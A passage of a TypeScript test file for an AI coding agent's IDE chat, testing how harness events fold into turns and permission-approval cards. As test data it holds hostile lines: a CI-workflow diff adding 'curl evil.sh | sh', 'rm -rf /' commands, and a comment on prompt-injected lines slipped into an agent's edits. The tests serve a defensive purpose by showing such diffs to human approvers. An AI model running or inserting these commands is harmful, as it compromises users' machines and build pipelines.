import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import type { ToolConversationPart } from "@alkera/chat-model";
import { describe, expect, it } from "vitest";
import {
  addOptimisticUserTurn,
  cloneTurns,
  conversationAwaitsResponse,
  createConversationFoldState,
  foldHarnessEvent,
  foldRelayedPrompt,
  summarizeSubagentActivity,
  type ConversationFoldState,
  type HarnessEvent,
} from "./harnessEventFold";
import { FAILURE_SENTENCES } from "./refusals";

// A refusal sentence an extension names, the way one registers it. The fold claims it
// before the open transport rules and shows its title in place of the raw sentence.
const REFUSED = "The request was refused.";
FAILURE_SENTENCES.register({ key: "test.refusal", cause: "refused", match: /no credit available/iu, title: REFUSED });

const REAL_OPENCODE_EVENTS = JSON.parse(
  readFileSync(
    resolve(process.cwd(), "../vscode-extension/src/engine/__fixtures__/opencode-turn.json"),
    "utf8",
  ),
) as HarnessEvent[];

// Shared with the extension-host driver test (opencodeSession.test.ts) so the
// daemon error-event shapes can't drift between the broadcast and fold halves.
const NO_CREDIT_THEN_TEARDOWN = (
  JSON.parse(
    readFileSync(
      resolve(
        process.cwd(),
        "../vscode-extension/src/engine/__fixtures__/opencode-error-turn.json",
      ),
      "utf8",
    ),
  ) as { noCreditThenTeardown: HarnessEvent[] }
).noCreditThenTeardown;

describe("harnessEventFold", () => {
  it("folds a replayed transcript into stable turns", () => {
    const state = createConversationFoldState();

    foldHarnessEvent(state, { event_type: "message.created", message_id: "u1", role: "user" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "u1",
      part: { part_id: "u1-text", message_id: "u1", type: "text", text: "Review contracts.py" },
    });
    foldHarnessEvent(state, { event_type: "turn.started", turn_id: "turn-1" });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "agent.thought_chunk",
      message_id: "a1",
      part_id: "think-1",
      text: "Checking imports",
    });
    foldHarnessEvent(state, {
      event_type: "agent.thought_chunk",
      message_id: "a1",
      part_id: "think-1",
      text: ".",
      is_final: true,
    });
    foldHarnessEvent(state, {
      event_type: "tool.call",
      message_id: "a1",
      tool_call_id: "tool-1",
      tool_name: "bash",
      status: "running",
      input: { command: "pytest" },
    });
    foldHarnessEvent(state, {
      event_type: "tool.call_update",
      tool_call_id: "tool-1",
      status: "completed",
      output: "494 passed",
    });
    foldHarnessEvent(state, {
      event_type: "permission.request",
      request_id: "perm-1",
      permission_kind: "edit",
      canonical_kind: "edit",
      patterns: ["packages/ui/src/**"],
      options: [{ option_id: "allow_once", name: "Allow once" }],
    });
    foldHarnessEvent(state, {
      event_type: "permission.request",
      request_id: "perm-1",
      permission_kind: "edit",
      canonical_kind: "edit",
      patterns: ["packages/ui/src/**"],
      options: [{ option_id: "allow_once", name: "Allow once" }],
    });
    foldHarnessEvent(state, {
      event_type: "plan.updated",
      entries: [
        { id: "p1", text: "Implement renderer", status: "completed" },
        { id: "p2", text: "Add tests", status: "in_progress" },
      ],
    });
    foldHarnessEvent(state, { event_type: "file.edited", path: "packages/ui/src/types.ts" });
    // subagent.started is DATA-ONLY: it binds a child id onto a matching `spawn_agent`
    // tool card, never its own part. With no spawn call here it buffers → still no part.
    foldHarnessEvent(state, {
      event_type: "subagent.started",
      child_session_id: "review-ui",
      agent_name: "agent_review_ui",
    });
    foldHarnessEvent(state, {
      event_type: "turn.finished",
      event_id: "summary-1",
      stop_reason: "complete",
      summary: "Implemented the renderer.",
      tokens: { input: 100, output: 40 },
      important_files: [
        {
          kind: "file",
          label: "RightSidebarChat.tsx",
          target: "packages/ui/src/ide/chat/RightSidebarChat.tsx",
        },
      ],
      artifacts: [
        {
          kind: "artifact",
          label: "preview.png",
          target: "apps/web/test-results/preview.png",
          preview: {
            kind: "table",
            title: "Validation",
            columns: ["check", "status"],
            rows: [{ check: "sidebar", status: "passed" }],
          },
        },
      ],
      graph_nodes: [{ kind: "node", label: "Coordinator", target: "graph://coordinator" }],
      runs: [{ kind: "run", label: "Visual check", target: "run://visual-check" }],
    });

    const turns = cloneTurns(state);
    expect(turns).toHaveLength(2);
    expect(turns[0]).toMatchObject({
      id: "u1",
      author: "user",
      parts: [{ kind: "text", text: "Review contracts.py" }],
    });
    expect(turns[1].status).toBe("done");
    expect(turns[1].parts.map((part) => part.kind)).toEqual([
      "thinking",
      "tool",
      "permission",
      "plan",
      "file_edited",
      "turn_summary",
    ]);
    expect(turns[1].parts[0]).toMatchObject({
      kind: "thinking",
      text: "Checking imports.",
      streaming: false,
    });
    expect(turns[1].parts[1]).toMatchObject({
      kind: "tool",
      name: "bash",
      state: "completed",
      output: "494 passed",
    });
    expect(turns[1].parts[2]).toMatchObject({
      kind: "permission",
      requestId: "perm-1",
      status: "pending",
      options: [{ optionId: "allow_once", name: "Allow once" }],
    });
    expect(turns[1].parts[3]).toMatchObject({
      kind: "plan",
      entries: [
        { id: "p1", text: "Implement renderer", status: "completed" },
        { id: "p2", text: "Add tests", status: "in_progress" },
      ],
    });
    // No "subagent" part — the unmatched subagent.started buffered, rendering nothing.
    expect(turns[1].parts[5]).toMatchObject({
      kind: "turn_summary",
      summary: "Implemented the renderer.",
      stopReason: "complete",
      tokens: { input: 100, output: 40 },
      files: [{ kind: "file", label: "types.ts", target: "packages/ui/src/types.ts" }],
      importantFiles: [{ kind: "file", label: "RightSidebarChat.tsx" }],
      artifacts: [
        {
          kind: "artifact",
          label: "preview.png",
          preview: {
            kind: "table",
            title: "Validation",
            columns: ["check", "status"],
            rows: [{ check: "sidebar", status: "passed" }],
          },
        },
      ],
      graphNodes: [{ kind: "node", label: "Coordinator" }],
      runs: [{ kind: "run", label: "Visual check" }],
    });
  });

  it("updates replayed tool parts by call id even when part id differs", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "a1",
      part: {
        part_id: "part-tool-1",
        message_id: "a1",
        type: "tool_call",
        call_id: "call-1",
        name: "bash",
        state: "running",
        input: { command: "pytest" },
      },
    });
    foldHarnessEvent(state, {
      event_type: "tool.call_update",
      tool_call_id: "call-1",
      status: "completed",
      output: "1 passed",
    });

    const toolParts = cloneTurns(state)[0].parts.filter((part) => part.kind === "tool");
    expect(toolParts).toHaveLength(1);
    expect(toolParts[0]).toMatchObject({
      id: "part-tool-1",
      state: "completed",
      output: "1 passed",
    });
  });

  it("does not attach interrupt events to a finished assistant turn", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "turn.started", turn_id: "turn-1" });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "agent.message_chunk",
      message_id: "a1",
      part_id: "text-1",
      text: "First turn",
      is_final: true,
    });
    foldHarnessEvent(state, {
      event_type: "turn.finished",
      event_id: "summary-1",
      summary: "Done.",
    });

    foldHarnessEvent(state, { event_type: "turn.started", turn_id: "turn-2" });
    foldHarnessEvent(state, {
      event_type: "permission.request",
      request_id: "perm-2",
      permission_kind: "shell",
      canonical_kind: "shell",
      options: [{ option_id: "reject_once", name: "No" }],
    });

    const turns = cloneTurns(state);
    expect(turns).toHaveLength(2);
    expect(turns[0].parts.map((part) => part.kind)).toEqual(["text", "turn_summary"]);
    expect(turns[1].parts).toEqual([
      expect.objectContaining({ kind: "permission", requestId: "perm-2" }),
    ]);
  });

  it.each([
    [{ tool_call_id: "prt_1", provider_call_id: "call_1" }, ["prt_1", "call_1"]],
    [{ tool_call_id: "prt_1" }, ["prt_1"]],
    [{}, undefined],
  ])("keeps the ids of the call an ask gates (%o)", (ids, expected) => {
    // The card shows the gated call's input for an ask that named nothing
    // else; these ids are how it finds that call among the turns.
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "permission.request",
      request_id: "perm-ids",
      permission_kind: "acme_deploy",
      options: [{ option_id: "allow_once", name: "Allow once" }],
      ...ids,
    });
    const [ask] = cloneTurns(state)[0].parts.filter((part) => part.kind === "permission");
    expect(ask.kind === "permission" ? ask.callIds : null).toEqual(expected);
  });

  it("upgrades a pending permission to prompting, without a duplicate part", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    // The event stream publishes the request BEFORE the policy/safety judge
    // runs — this copy is untagged and must NOT raise the interactive queue.
    foldHarnessEvent(state, {
      event_type: "permission.request",
      request_id: "perm-1",
      permission_kind: "shell",
      canonical_kind: "shell",
      options: [{ option_id: "allow_once", name: "Allow once" }],
    });
    let permissions = cloneTurns(state)[0].parts.filter((part) => part.kind === "permission");
    expect(permissions).toHaveLength(1);
    expect(permissions[0]).toMatchObject({ status: "pending" });
    expect(permissions[0]).not.toHaveProperty("prompting", true);

    // The broker decided a HUMAN must answer: same request id, tagged.
    foldHarnessEvent(state, {
      event_type: "permission.request",
      request_id: "perm-1",
      permission_kind: "shell",
      canonical_kind: "shell",
      options: [{ option_id: "allow_once", name: "Allow once" }],
      prompting: true,
    });
    permissions = cloneTurns(state)[0].parts.filter((part) => part.kind === "permission");
    expect(permissions).toHaveLength(1);
    expect(permissions[0]).toMatchObject({ status: "pending", prompting: true });
  });

  it("completes an ask that arrived before its subject, in place, under the same id", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    // The ask raced ahead of the tool part naming the command: it arrives
    // waiting for its subject, with the narrow options a blank ask offers.
    foldHarnessEvent(state, {
      event_type: "permission.request",
      event_id: "e1",
      request_id: "perm-race",
      permission_kind: "bash",
      canonical_kind: "shell",
      patterns: [],
      subject_pending: true,
      options: [{ option_id: "allow_once", name: "Allow once" }],
    });
    let permissions = cloneTurns(state)[0].parts.filter((part) => part.kind === "permission");
    expect(permissions).toHaveLength(1);
    expect(permissions[0]).toMatchObject({ status: "pending", subjectPending: true, patterns: [] });

    // The harness raises it again once the part lands: same id, now named.
    foldHarnessEvent(state, {
      event_type: "permission.request",
      event_id: "e2",
      request_id: "perm-race",
      permission_kind: "bash",
      canonical_kind: "shell",
      patterns: ["git status"],
      subject: { capability: "shell", operation: "git_status", effect: "read", targets: [] },
      options: [
        { option_id: "allow_once", name: "Allow once" },
        { option_id: "allow_always", name: "Always allow" },
        { option_id: "reject_once", name: "Reject once" },
      ],
    });
    permissions = cloneTurns(state)[0].parts.filter((part) => part.kind === "permission");
    expect(permissions).toHaveLength(1);
    expect(permissions[0]).toMatchObject({
      status: "pending",
      patterns: ["git status"],
      subject: expect.objectContaining({ operation: "git_status" }),
    });
    expect(permissions[0]).not.toHaveProperty("subjectPending");
    expect(permissions[0]).not.toHaveProperty("prompting", true);
    expect((permissions[0] as { options: unknown[] }).options).toHaveLength(3);

    // A settled subject is not overwritten by a later copy of the same ask.
    foldHarnessEvent(state, {
      event_type: "permission.request",
      event_id: "e3",
      request_id: "perm-race",
      permission_kind: "bash",
      canonical_kind: "shell",
      patterns: ["rm -rf /"],
      options: [{ option_id: "allow_once", name: "Allow once" }],
      prompting: true,
    });
    permissions = cloneTurns(state)[0].parts.filter((part) => part.kind === "permission");
    expect(permissions[0]).toMatchObject({ patterns: ["git status"], prompting: true });
  });

  // Not every mirror raises the ask a second time once it knows the command:
  // an older box publishes the subject-less ask and nothing more. The call's
  // own part carries the arguments, and it is the same call the ask named — so
  // the subject is recovered from there rather than leaving the card naming
  // only the tool for as long as the prompt is up.
  it.each([
    ["a shell call", "bash", { command: "cd /opt/alkera-work && ls" }, "cd /opt/alkera-work && ls"],
    ["a write call", "write", { filePath: "src/app.ts", content: "hi" }, "src/app.ts"],
    ["an edit call", "edit", { file_path: "notes/readme.md" }, "notes/readme.md"],
  ])("takes the subject from %s's own part when the ask never carried one", (
    _case,
    toolName,
    input,
    expected,
  ) => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "permission.request",
      event_id: "e1",
      request_id: "perm-late",
      tool_call_id: "call-9",
      permission_kind: toolName,
      canonical_kind: toolName === "bash" ? "shell" : "edit",
      patterns: [],
      options: [{ option_id: "allow_once", name: "Allow once" }],
    });
    const askOnly = cloneTurns(state)[0].parts.filter((part) => part.kind === "permission");
    expect(askOnly[0]).toMatchObject({ patterns: [] });

    foldHarnessEvent(state, {
      event_type: "tool.call",
      message_id: "a1",
      tool_call_id: "call-9",
      tool_name: toolName,
      status: "running",
      input,
    });

    const permissions = cloneTurns(state)[0].parts.filter((part) => part.kind === "permission");
    expect(permissions).toHaveLength(1);
    expect(permissions[0]).toMatchObject({ status: "pending", patterns: [expected] });
    expect(permissions[0]).not.toHaveProperty("subjectPending");
  });

  it("matches the gated call by the provider's id when the ask keys it that way", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "permission.request",
      event_id: "e1",
      request_id: "perm-provider",
      provider_call_id: "call_abc",
      permission_kind: "bash",
      canonical_kind: "shell",
      patterns: [],
      options: [{ option_id: "allow_once", name: "Allow once" }],
    });
    foldHarnessEvent(state, {
      event_type: "tool.call",
      message_id: "a1",
      tool_call_id: "call_abc",
      tool_name: "bash",
      status: "running",
      input: { command: "git status" },
    });

    const permissions = cloneTurns(state)[0].parts.filter((part) => part.kind === "permission");
    expect(permissions[0]).toMatchObject({ patterns: ["git status"] });
  });

  it.each([
    ["the gated call never lands", null],
    ["the call opened with no arguments yet", { tool_call_id: "call-9", input: {} }],
  ])("leaves the ask naming only its tool while %s", (_case, call) => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "permission.request",
      event_id: "e1",
      request_id: "perm-orphan",
      tool_call_id: "call-9",
      permission_kind: "bash",
      canonical_kind: "shell",
      patterns: [],
      options: [{ option_id: "allow_once", name: "Allow once" }],
    });
    if (call) {
      foldHarnessEvent(state, {
        event_type: "tool.call",
        message_id: "a1",
        tool_name: "bash",
        status: "running",
        ...call,
      });
    }
    // A DIFFERENT call's part must not be mistaken for the gated one.
    foldHarnessEvent(state, {
      event_type: "tool.call",
      message_id: "a1",
      tool_call_id: "call-other",
      tool_name: "bash",
      status: "running",
      input: { command: "rm -rf /" },
    });

    const permissions = cloneTurns(state)[0].parts.filter((part) => part.kind === "permission");
    expect(permissions[0]).toMatchObject({ patterns: [] });
  });

  // The harness re-raises the same ask under its own id once it learns the
  // command. A reader who has already answered must not be asked again: the
  // answer they gave covers that request, and a second card over it is a
  // decision they never made being demanded twice.
  it("never re-opens an ask the reader already answered, however late the command lands", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "permission.request",
      event_id: "e1",
      request_id: "perm-1",
      permission_kind: "bash",
      canonical_kind: "shell",
      patterns: [],
      subject_pending: true,
      options: [{ option_id: "allow_once", name: "Allow once" }],
    });
    foldHarnessEvent(state, {
      event_type: "permission.resolved",
      request_id: "perm-1",
      option_id: "allow_once",
    });
    foldHarnessEvent(state, {
      event_type: "permission.request",
      event_id: "e2",
      request_id: "perm-1",
      permission_kind: "bash",
      canonical_kind: "shell",
      patterns: ["cd /opt/alkera-work && ls"],
      prompting: true,
      options: [
        { option_id: "allow_once", name: "Allow once" },
        { option_id: "reject_once", name: "Reject once" },
      ],
    });

    const answered = cloneTurns(state)[0].parts.filter((part) => part.kind === "permission");
    expect(answered).toHaveLength(1);
    expect(answered[0]).toMatchObject({
      status: "resolved",
      selectedOptionId: "allow_once",
    });
    expect(answered[0]).not.toHaveProperty("prompting", true);

    // A genuinely new ask is a new decision and opens its own card.
    foldHarnessEvent(state, {
      event_type: "permission.request",
      event_id: "e3",
      request_id: "perm-2",
      permission_kind: "bash",
      canonical_kind: "shell",
      patterns: ["rm build/"],
      prompting: true,
      options: [{ option_id: "allow_once", name: "Allow once" }],
    });

    const both = cloneTurns(state)[0].parts.filter((part) => part.kind === "permission");
    expect(both).toHaveLength(2);
    expect(both[1]).toMatchObject({
      requestId: "perm-2",
      status: "pending",
      patterns: ["rm build/"],
    });
  });

  it("folds the ActionDescriptor subject onto the permission part", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "permission.request",
      request_id: "perm-1",
      permission_kind: "sql",
      canonical_kind: "other",
      options: [{ option_id: "allow_once", name: "Allow once" }],
      subject: {
        capability: "sql",
        effect: "destroy",
        operation: "DROP TABLE",
        confidence: "heuristic",
        reasons: ["irreversible", "prod target"],
        targets: [
          // The wire still carries `environment` — the fold must IGNORE it (we
          // don't infer prod/dev). The connection + name survive.
          { kind: "table", name: "analytics.events", connection: "snowflake", environment: "prod" },
          { kind: "table" }, // name-less target is still kept (kind survives)
          {}, // fully empty target is dropped
        ],
        cost_estimate: {
          usd_amount: 0.12,
          bytes_scanned: 2048,
          rows_scanned: 1500,
          wallet_currency: "usd",
        },
      },
    });

    const permission = cloneTurns(state)[0].parts.find((part) => part.kind === "permission");
    const subject = permission?.kind === "permission" ? permission.subject : undefined;
    expect(subject).toMatchObject({
      capability: "sql",
      effect: "destroy",
      operation: "DROP TABLE",
      confidence: "heuristic",
      reasons: ["irreversible", "prod target"],
      cost: { usd: 0.12, bytesScanned: 2048, rowsScanned: 1500, currency: "usd" },
      targets: [
        { kind: "table", name: "analytics.events", connection: "snowflake" },
        { kind: "table", name: "" },
      ],
    });
    // The folded targets carry no `environment` — it's deliberately dropped.
    expect(subject?.targets.every((target) => !("environment" in target))).toBe(true);
  });

  it("keeps an unreadable effect as unknown, drops an unreadable confidence, and drops a hollow subject", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    // A confidence tag this build cannot read is dropped: it only shades how
    // the card presents what it already knows. The EFFECT is not, because the
    // approval gate reads it — a verdict that cannot be read is still a verdict,
    // and the machine treats every one that is not `read` as a write. Scrubbing
    // it to nothing left the ask looking unclassified and offered an approval
    // the box goes on to drop.
    foldHarnessEvent(state, {
      event_type: "permission.request",
      request_id: "perm-1",
      permission_kind: "shell",
      canonical_kind: "shell",
      options: [{ option_id: "allow_once", name: "Allow once" }],
      subject: { effect: "nuke", confidence: "vibes", targets: [], reasons: [] },
    });
    foldHarnessEvent(state, {
      event_type: "permission.request",
      request_id: "perm-2",
      permission_kind: "shell",
      canonical_kind: "shell",
      options: [{ option_id: "allow_once", name: "Allow once" }],
      subject: { capability: "shell", effect: "read", operation: "echo", targets: [], reasons: [] },
    });
    // Nothing real at all — no capability, no verdict, nothing to say — so
    // there is no subject to attach.
    foldHarnessEvent(state, {
      event_type: "permission.request",
      request_id: "perm-3",
      permission_kind: "shell",
      canonical_kind: "shell",
      options: [{ option_id: "allow_once", name: "Allow once" }],
      subject: { confidence: "vibes", targets: [], reasons: [] },
    });

    const perms = cloneTurns(state)[0].parts.filter((part) => part.kind === "permission");
    expect(perms[0].kind === "permission" && perms[0].subject).toMatchObject({
      effect: "unknown",
    });
    expect(perms[0].kind === "permission" && perms[0].subject?.confidence).toBeUndefined();
    // perm-2: a real capability/effect survives.
    expect(perms[1].kind === "permission" && perms[1].subject).toMatchObject({
      capability: "shell",
      effect: "read",
    });
    expect(perms[1].kind === "permission" && perms[1].subject?.confidence).toBeUndefined();
    expect(perms[2].kind === "permission" && perms[2].subject).toBeUndefined();
  });

  it("folds the lineage impact assessment onto the permission part", () => {
    const state = createConversationFoldState();
    const mrr = "warehouse://finance.mrr#amount";
    const reason = "Two teams own what this write reaches.";
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "permission.request",
      request_id: "perm-1",
      permission_kind: "sql",
      canonical_kind: "other",
      options: [{ option_id: "allow_once", name: "Allow once" }],
      impact: {
        status: "resolved",
        category: "breaking",
        targets: ["warehouse://analytics.orders"],
        affected: [
          { urn: mrr, category: "breaking", transformation: "" },
          { category: "breaking" }, // no urn, so no row a person could act on
        ],
        concepts: [{ urn: mrr, item_id: "k1", meaning: "Revenue the board reads." }],
        owner_teams: ["finance", "  "], // a blank team is not a team
        unsure: true,
        reason,
      },
    });
    const permission = cloneTurns(state)[0].parts.find((part) => part.kind === "permission");
    const impact = permission?.kind === "permission" ? permission.impact : undefined;
    expect(impact).toEqual({
      status: "resolved",
      category: "breaking",
      targets: ["warehouse://analytics.orders"],
      // An edge the taxonomy could not name reads "unknown" rather than blank.
      affected: [{ urn: mrr, category: "breaking", transformation: "unknown" }],
      concepts: [
        { urn: mrr, itemId: "k1", title: "", meaning: "Revenue the board reads.", ownerTeams: [] },
      ],
      ownerTeams: ["finance"],
      unsure: true,
      reason,
    });
  });

  it("never re-flags a resolved permission, even if a late tagged copy arrives", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "permission.request",
      request_id: "perm-1",
      permission_kind: "shell",
      canonical_kind: "shell",
      options: [{ option_id: "allow_once", name: "Allow once" }],
    });
    foldHarnessEvent(state, {
      event_type: "permission.resolved",
      request_id: "perm-1",
      option_id: "allow_once",
    });
    foldHarnessEvent(state, {
      event_type: "permission.request",
      request_id: "perm-1",
      prompting: true,
    });

    const permissions = cloneTurns(state)[0].parts.filter((part) => part.kind === "permission");
    expect(permissions).toHaveLength(1);
    expect(permissions[0]).toMatchObject({ status: "resolved", selectedOptionId: "allow_once" });
    expect(permissions[0]).not.toHaveProperty("prompting", true);
  });

  it("updates a pending question when the daemon reuses its request id", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "question.request",
      request_id: "question-1",
      questions: [{ question: "Pick one", options: [{ label: "A" }] }],
    });
    foldHarnessEvent(state, {
      event_type: "question.request",
      request_id: "question-1",
      questions: [
        { question: "Pick a branch", options: [{ label: "main" }] },
        { question: "Pick a data source", options: [{ label: "warehouse" }] },
      ],
    });

    const questions = cloneTurns(state)[0].parts.filter((part) => part.kind === "question");
    expect(questions).toHaveLength(1);
    expect(questions[0]).toMatchObject({
      kind: "question",
      requestId: "question-1",
      questions: [
        { question: "Pick a branch", options: [{ label: "main" }] },
        { question: "Pick a data source", options: [{ label: "warehouse" }] },
      ],
    });
  });

  it("preserves diff counts and previews from file edit events", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, {
      event_type: "file.edited",
      event_id: "edit-1",
      path: "packages/ui/src/ide/chat/RightSidebarChat.tsx",
      insertions: 128,
      deletions: 42,
      preview: { kind: "diff", title: "Patch", content: "+ compact row" },
    });

    const edit = cloneTurns(state)[0].parts[0];
    expect(edit).toMatchObject({
      kind: "file_edited",
      resource: {
        diff: { insertions: 128, deletions: 42 },
        preview: { kind: "diff", title: "Patch", content: "+ compact row" },
      },
    });
  });

  it("attaches a preview with no counts when deletions are absent", () => {
    // `foldFileEdited` only sets `resource.diff` when BOTH counts are
    // present; the preview attaches independently, so a new-file diff still
    // renders its green additions even if the writer omitted the counts.
    const state = createConversationFoldState();
    const content = "--- new.py\n+++ new.py\n@@ -0,0 +1,2 @@\n+line a\n+line b\n";
    foldHarnessEvent(state, {
      event_type: "file.edited",
      event_id: "edit-new",
      path: "new.py",
      insertions: 2,
      preview: { kind: "diff", title: "new.py", content },
    });

    const edit = cloneTurns(state)[0].parts[0];
    expect(edit).toMatchObject({
      kind: "file_edited",
      resource: { preview: { kind: "diff", title: "new.py", content } },
    });
    expect(edit.kind === "file_edited" && edit.resource.diff).toBeUndefined();
  });

  it("merges file.edited into the matching write tool card", () => {
    const state = createConversationFoldState();
    const path = "/var/folders/q0/T/agent/scratch.txt";
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "tool.call",
      message_id: "a1",
      tool_call_id: "tool-1",
      tool_name: "write",
      // opencode's write tool uses camelCase `filePath`.
      input: { filePath: path, content: "hi" },
      status: "completed",
    });
    foldHarnessEvent(state, {
      event_type: "file.edited",
      event_id: "edit-1",
      path,
      insertions: 2,
      deletions: 0,
      preview: { kind: "diff", title: "scratch.txt", content: "@@ -0,0 +1,1 @@\n+hi\n" },
    });

    const parts = cloneTurns(state)[0].parts;
    // Exactly one card — the write tool part — not a tool part PLUS a file_edited.
    expect(parts).toHaveLength(1);
    expect(parts[0].kind).toBe("tool");
    expect(parts[0].kind === "tool" && parts[0].resources).toMatchObject([
      { kind: "file", target: path, preview: { kind: "diff", content: "@@ -0,0 +1,1 @@\n+hi\n" } },
    ]);
  });

  it("keeps the edit diff when an always-allowed write emits only tool metadata", () => {
    const state = createConversationFoldState();
    const path = "src/app.ts";
    const patch = "@@ -1,1 +1,2 @@\n old\n+new\n";
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "tool.call",
      message_id: "a1",
      tool_call_id: "tool-1",
      tool_name: "edit",
      input: { file_path: path },
      status: "running",
    });
    foldHarnessEvent(state, { event_type: "file.edited", path });
    foldHarnessEvent(state, {
      event_type: "tool.call_update",
      tool_call_id: "tool-1",
      status: "completed",
      metadata: { filediff: { file: path, patch, additions: 1, deletions: 0 } },
    });

    const parts = cloneTurns(state)[0].parts;
    expect(parts).toHaveLength(1);
    expect(parts[0]).toMatchObject({
      kind: "tool",
      resources: [
        {
          target: path,
          diff: { insertions: 1, deletions: 0 },
          preview: { kind: "diff", content: patch },
        },
      ],
    });
  });

  it("keeps a standalone file_edited card when no write tool produced the edit", () => {
    // An edit with no matching tool call (external/indirect change) still
    // renders its own card — the merge only collapses true duplicates.
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "tool.call",
      message_id: "a1",
      tool_call_id: "tool-1",
      tool_name: "bash",
      input: { command: "echo hi" },
      status: "completed",
    });
    foldHarnessEvent(state, { event_type: "file.edited", event_id: "e1", path: "other.txt" });

    const kinds = cloneTurns(state)[0].parts.map((part) => part.kind);
    expect(kinds).toEqual(["tool", "file_edited"]);
  });

  // ---- the PRE-APPROVAL edit diff -------------------------------------------
  // A `permission.request` for an edit carries the diff the adapter captured AT
  // ASK TIME (schema 1.3.0: insertions/deletions/preview). It is the only copy
  // that exists while the human is deciding — the `file.edited` holding the same
  // diff lands only AFTER the write. Without it the approver sees a path and
  // nothing else, so a prompt-injected extra line in an otherwise expected edit
  // is invisible until it is already on disk.

  /** tool.call for a write of `path`, then the ask that gates it. */
  function askToWrite(
    state: ReturnType<typeof createConversationFoldState>,
    path: string,
    content: string,
    extra: HarnessEvent = {},
  ): void {
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "tool.call",
      message_id: "a1",
      tool_call_id: "prt_write1",
      tool_name: "write",
      input: { filePath: path, content: "…" },
      status: "running",
    });
    foldHarnessEvent(state, {
      event_type: "permission.request",
      request_id: "perm-1",
      tool_call_id: "toolu_abc", // model-side id — deliberately != the part id
      permission_kind: "edit",
      canonical_kind: "edit",
      patterns: [path],
      insertions: 2,
      deletions: 1,
      preview: { kind: "diff", title: "ci.yml", content, path },
      options: [{ option_id: "allow_once", name: "Allow once" }],
      ...extra,
    });
  }

  const INJECTED = "@@ -1,2 +1,3 @@\n line\n-old\n+new\n+  curl evil.sh | sh\n";

  it("shows the edit's diff on the write card BEFORE the ask is answered", () => {
    const state = createConversationFoldState();
    askToWrite(state, ".github/workflows/ci.yml", INJECTED);

    // Nothing has been approved or written yet — this is the decision moment.
    const parts = cloneTurns(state)[0].parts;
    const permission = parts.find((part) => part.kind === "permission");
    expect(permission).toMatchObject({
      status: "pending",
      preview: { kind: "diff", title: "ci.yml", content: INJECTED },
    });
    const tool = parts.find((part): part is ToolConversationPart => part.kind === "tool");
    expect(tool?.resources).toMatchObject([
      {
        kind: "file",
        target: ".github/workflows/ci.yml",
        diff: { insertions: 2, deletions: 1 },
        preview: { kind: "diff", content: INJECTED },
      },
    ]);
  });

  it("attaches the ask-time diff when the ask races the tool call", () => {
    // The permission ask can reach the webview before the tool.call that renders
    // its card; the diff must land when the card shows up, not be dropped.
    const state = createConversationFoldState();
    const path = "Makefile";
    foldHarnessEvent(state, {
      event_type: "permission.request",
      request_id: "perm-1",
      tool_call_id: "prt_write1",
      permission_kind: "edit",
      canonical_kind: "edit",
      patterns: [path],
      insertions: 1,
      deletions: 0,
      preview: { kind: "diff", title: "Makefile", content: "+evil\n", path },
      options: [{ option_id: "allow_once", name: "Allow once" }],
    });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "tool.call",
      message_id: "a1",
      tool_call_id: "prt_write1",
      tool_name: "edit",
      input: { file_path: path },
      status: "running",
    });

    const tool = cloneTurns(state)
      .flatMap((turn) => turn.parts)
      .find((part): part is ToolConversationPart => part.kind === "tool");
    expect(tool?.resources).toMatchObject([{ target: path, preview: { content: "+evil\n" } }]);
  });

  it("is idempotent across the ask's second (prompting) arrival", () => {
    // The same request arrives twice — event stream, then the broker's
    // human-prompt broadcast. The card must not end up with two diffs.
    const state = createConversationFoldState();
    askToWrite(state, "app.py", "+a\n");
    askToWrite(state, "app.py", "+a\n", { prompting: true });

    const tool = cloneTurns(state)[0].parts.find(
      (part): part is ToolConversationPart => part.kind === "tool",
    );
